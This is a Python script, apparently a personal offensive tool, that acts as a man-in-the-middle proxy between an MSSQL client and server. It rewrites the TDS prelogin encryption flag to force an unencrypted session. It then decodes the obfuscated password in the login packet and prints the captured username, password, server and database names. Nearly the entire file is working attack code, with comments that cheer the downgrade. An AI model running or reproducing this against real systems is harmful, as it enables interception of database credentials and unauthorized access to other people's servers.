
"""
Author         : Giannis Christodoulakos

Date           : 2024-11-04  

Description    : This script processes TDS (Tabular Data Stream) login packets,
                 decrypts sensitive information, and outputs details such as
                 client name, server name, username, password, and database name.
"""

import socket
import binascii
import argparse
import sys


def parse_arguments():
    parser = argparse.ArgumentParser(description="Capture and forward MSSQL packets.")
    parser.add_argument("-s", "--server", required=True, help="Target MSSQL server IP address.")
    parser.add_argument("-c", "--client", required=True, help="Client IP address.")
    parser.add_argument("-p", "--port", type=int, default=1433, help="Target port (default: 1433).")
    return parser.parse_args()

def retrieve_password(password): # Fun checked
    # Return immediately if password is None or has length 0
    if password is None or len(password) == 0:
        return password

    # Convert password bytes to a list of integers
    password = list(password)
    plain = []

    for char in password:
        # XOR each byte with 0xA5
        a = char ^ 0xA5

        # Rearrange bits
        high = (a & 0xf0) >> 4
        low = (a & 0x0f) << 4
        a = high | low

        plain.append(a)

    # Convert list of integers back to bytes
    return bytes(plain)

def modify_prelogin_request(packet):
    try:
        # Split the packet into TDS packet info and prelogin packet message containing the options
        packet_info = packet[0:8]  # TDS packet header
        packet_options = packet[8:]  # TDS packet options

        packet_type = packet_info[0]  # TDS packet type (e.g., Prelogin, Prelogin Response, etc.)
        packet_length = int.from_bytes(packet_info[2:4])  # Packet length field

        # Check if the packet is a Prelogin Response packet and not setting up SSL
        if packet_type == 0x12 and packet_length <= 94:
            print("Prelogin Request packet found !")

            i = 0
            option_per_bytes = 5
            option = 0

            # Loop through options in the TDS packet
            while option != 5:
                i = option * option_per_bytes

                if option == 1:  # Finding the encryption option in the TDS packet
                    enc_option_offset = int.from_bytes(packet_options[i+1:i+3],byteorder="big")  # Offset within options
                    enc_option = packet_options[enc_option_offset]  # Encryption option byte
                    if enc_option != 0x02:
                        # Convert the packet to a bytearray to allow modification
                        mutable_packet = bytearray(packet)

                        # Modify the byte at the encryption option offset
                        mutable_packet[enc_option_offset + 0x08] = 0x02

                        # Convert back to bytes if needed (optional)
                        modified_packet = bytes(mutable_packet)
                        print ("Packet:", packet.hex())
                        print("Modified Packet:", modified_packet.hex())  # Return the modified packet
                        return modified_packet

                option += 1
        else:
            
            return packet

    except IndexError as e:
        print(f"IndexError: {e}. Packet structure may not match expected format.")
        return packet
    except Exception as e:
        print(f"An error occurred: {e}")
        return packet

def encryption_setting(option_byte,packet): #fun checked

    packet = modify_prelogin_request(packet)

    if option_byte == 0x00:
        print("ENCRYPT is set to ENCRYPT_OFF.  Yes sir ! Let's Downgrade it")
        return packet

    elif option_byte ==0x01:
        print ("ENCRYPT is set to ENCRYPT_ON. The attack will not work. You have to patch the encryption setting of client on connection string !")
        return packet
    elif option_byte == 0x02:
        print("ENCRYPT is set to ENCRYPT_NOT_SUP. LOL !")
        return packet
    elif option_byte == 0x03:
        print("ENCRYPT is set to ENCRYPT_REQ. Probably the downgrade will not work. Proceed altering the behaviour of client application")
        return packet
    else:
        print ("Encryption type cannot be determined")
        return packet
    

def check_client_encryption (packet): #fun fixed !
    try:
        # Split the packet into TDS packet info and prelogin packet message containing the options
        packet_info = packet[0:8]  # TDS packet header
        packet_options = packet[8:]  # TDS packet options

        packet_type = packet_info[0]  # TDS packet type (e.g., Prelogin, Prelogin Response, etc.)
        packet_length = int.from_bytes(packet_info[2:4])  # Packet length field

        # Check if the packet is a Prelogin Response packet and not setting up SSL
        if packet_type == 0x12 and packet_length <= 94:

            i = 0
            option_per_bytes = 5
            option = 0

            while option != 5:
                i = option * option_per_bytes
                if option == 1:  # Finding the encryption option in the TDS packet
                    enc_option_offset = int.from_bytes(packet_options[i+1:i+3],byteorder="big")  # Offset within options
                    print(f"offset:{enc_option_offset}")
                    enc_option = packet_options[enc_option_offset]  # Encryption option byte
                    return encryption_setting(enc_option,packet)

                option +=1
        else:
            return packet    
    
    except IndexError as e:
        print(f"IndexError: {e}. Packet structure may not match expected format.")
        return packet
        
    except Exception as e:
        print(f"An error occurred: {e}")
        return packet
        

def modify_prelogin_response(packet):
    try:
        # Split the packet into TDS packet info and prelogin packet message containing the options
        packet_info = packet[0:8]  # TDS packet header
        packet_options = packet[8:]  # TDS packet options

        packet_type = packet_info[0]  # TDS packet type (e.g., Prelogin, Prelogin Response, etc.)
        packet_length = int.from_bytes(packet_info[2:4])  # Packet length field

        # Check if the packet is a Prelogin Response packet and not setting up SSL
        if packet_type == 0x4 and packet_length <= 0x40:
            print("Prelogin packet")
            print("Packet length:", len(packet))
            print("Packet contents:", packet)

            i = 0
            option_per_bytes = 5
            option = 0

            # Loop through options in the TDS packet
            while option != 5:
                i = option * option_per_bytes

                if option == 1:  # Finding the encryption option in the TDS packet
                    enc_option_offset = int.from_bytes(packet_options[i+1:i+3],byteorder="big")  # Offset within options
                    enc_option = packet_options[enc_option_offset]  # Encryption option byte
                    if enc_option != 0x02:
                        # Convert the packet to a bytearray to allow modification
                        mutable_packet = bytearray(packet)

                        # Modify the byte at the encryption option offset
                        mutable_packet[enc_option_offset + 0x08] = 0x02

                        # Convert back to bytes if needed (optional)
                        modified_packet = bytes(mutable_packet)

                        print("Modified Packet:", modified_packet)  # Return the modified packet
                        return modified_packet

                option += 1
        else:
            
            return packet

    except IndexError as e:
        print(f"IndexError: {e}. Packet structure may not match expected format.")
        return packet
    except Exception as e:
        print(f"An error occurred: {e}")
        return packet

def find_login_packet(packet):
    try:
        packet_info = packet[0:8]  # TDS packet header
        packet_data = packet[8:]  # TDS packet options

        packet_type = packet_info[0]  # TDS packet type (e.g., Prelogin, Prelogin Response, etc.)
        #packet_length = packet_info[3]  # Packet length field
        
        if packet_type == 0x10:

            print("Login Packet was found !")
            packet_offsets = packet [44:94] # if it's a Login Packet
            
            i=0
            param_bytes = 4
            parameter = 0
            
            while parameter < 9:

                i = parameter * param_bytes
    
                if (parameter == 0):# Get client name offset and length
                    client_name_offset = int.from_bytes(packet_offsets[i:i+2],byteorder="little") # fucking little indian tripped me so hard
                    client_name_length = int.from_bytes(packet_offsets[i+2:i+4],byteorder="little")*2
                    #print(client_name_length) 
                    client_name = packet_data[client_name_offset:client_name_offset+client_name_length]
                    client_name = client_name.decode("utf-8")
                    #print(client_name)

                if (parameter == 1): # Get the usename 
                    user_offset = int.from_bytes(packet_offsets[i:i+2],byteorder="little")
                    user_length = int.from_bytes(packet_offsets[i+2:i+4],byteorder="little")*2
                    username = packet_data [user_offset:user_offset+user_length]
                    username = username.decode("utf-8")
                    #print(username)

                if (parameter == 2): # Get the password 
                    pass_offset = int.from_bytes(packet_offsets[i:i+2],byteorder="little")
                    pass_length = int.from_bytes(packet_offsets[i+2:i+4],byteorder="little")*2
                    password_obs = packet_data [pass_offset:pass_offset+pass_length]
                    password = retrieve_password(password_obs).decode("utf-8")
                    #print (password)
                
                if (parameter == 3): # Get the app name 
                    app_offset = int.from_bytes(packet_offsets[i:i+2],byteorder="little")
                    app_length = int.from_bytes(packet_offsets[i+2:i+4],byteorder="little")*2
                    app = packet_data [app_offset:app_offset+app_length]
                    app_name = app.decode("utf-8")
                    #print(app_name)
                
                if (parameter == 4): # Get server name
                    server_offset = int.from_bytes(packet_offsets[i:i+2],byteorder="little")
                    server_length = int.from_bytes(packet_offsets[i+2:i+4],byteorder="little")*2
                    server_name = packet_data[server_offset:server_offset+server_length]
                    server_name = server_name.decode("utf-8")
                    #print(server_name)

                if (parameter == 8): # Get database name
                    database_offset = int.from_bytes(packet_offsets[i:i+2],byteorder="little")
                    database_length = int.from_bytes(packet_offsets[i+2:i+4],byteorder="little")*2
                    database_name = packet_data[database_offset:database_offset+database_length]
                    database_name = database_name.decode("utf-8")
                    #print(database_name)
                    
                parameter += 1 

                if parameter == 9:
                    print("\nTDS Login Packet Decrypted Successfully!")
                    print("========================================")
                    print(f"Client Name    : {client_name}")
                    print(f"Server Name    : {server_name}")
                    print(f"Username       : {username}")
                    print(f"Password       : {password}")
                    print(f"Database Name  : {database_name}")
                    print("========================================\n")


    except IndexError as e:
        print(f"IndexError: {e}. Login Packet structure may not match expected format.")
        return packet
    except Exception as e:
        print(f"An error occurred: {e}")
        return packet      


def start_packet_capture(server_ip, client_ip, port):
    # Create a TCP socket for client communication
    client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_sock.bind(("0.0.0.0", port))  # Bind to all available interfaces
    client_sock.listen(1)
    print(f"[*] Waiting for client {client_ip} connection...")
    conn, addr = client_sock.accept()
    print(f"[*] Client {addr} connected.")

    # Create a socket to connect to the MSSQL server
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect((server_ip, port))
    print(f"[*] Connected to server {server_ip} on port {port}")

    while True:
        # Receive packet from the client
        packet = conn.recv(65535)
        if not packet:
            break
        
        #Check  client encryption type
        
        find_login_packet (packet)

        modified_packet = check_client_encryption(packet)
        # Forward packet to the server
        server_sock.send(modified_packet)

        # Receive response from the server
        response = server_sock.recv(65535)
        if not response:
            break

        # Identify packet type of server response
        
        response_modified = modify_prelogin_response(response)
        if response_modified is None:
            response_modified = response
        # Forward response back to the client
        conn.send(response_modified)
        print("[*] Response forwarded to the client.")

    conn.close()
    server_sock.close()
    print("[*] Connection closed.")

if __name__ == "__main__":
    args = parse_arguments()
    try:
        start_packet_capture(args.server, args.client, args.port)
    except KeyboardInterrupt:
        
        print("\n[*] Packet capture and forwarding stopped.")
        sys.exit(0)
